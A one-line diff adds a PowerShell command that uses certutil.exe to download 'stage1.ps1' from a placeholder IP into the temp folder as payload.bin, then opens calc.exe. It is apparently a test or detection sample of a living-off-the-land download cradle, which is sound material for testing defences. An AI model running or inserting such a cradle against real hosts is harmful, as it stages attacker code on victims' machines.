@@ -1,0 +1,1 @@
+certutil.exe -urlcache -split -f 'http://192.0.2.218/stage1.ps1' "$env:TEMP\payload.bin"; Start-Process -FilePath "calc.exe"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; $ProgressPreference = "SilentlyContinue"
